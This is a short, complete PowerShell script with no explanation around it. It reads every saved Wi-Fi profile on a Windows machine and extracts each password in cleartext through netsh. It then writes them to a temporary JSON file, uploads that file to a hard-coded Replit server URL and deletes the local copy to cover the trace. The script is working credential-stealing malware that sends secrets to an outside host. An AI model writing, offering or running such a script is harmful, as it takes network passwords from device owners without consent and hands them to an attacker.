$wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile"
$wifiPasswords = @()

foreach ($profile in $wifiProfiles) {
    $profileName = $profile -replace "All User Profile\s+:\s+"
    $wifiPassword = (netsh wlan show profile name="$profileName" key=clear) | Select-String "Key Content"
    $password = $wifiPassword -replace "Key Content\s+:\s+", ""
    
    $wifiPasswords += [PSCustomObject]@{
        "Profile Name" = $profileName
        "Password" = $password
    }
}

# Convert the data to JSON
$jsonData = $wifiPasswords | ConvertTo-Json

# URL of your Replit server endpoint
$replitUrl = "https://52f56a4e-599f-460a-9a7f-30366e004a3f-00-1gskngmpkkspx.sisko.replit.dev/upload"

# Save the data to a temporary JSON file
$jsonFilePath = [System.IO.Path]::GetTempFileName() + ".json"
$jsonData | Set-Content -Path $jsonFilePath

# Upload the file to Replit
Invoke-WebRequest -Uri $replitUrl -Method Post -InFile $jsonFilePath

# Clean up the temporary file
Remove-Item $jsonFilePath
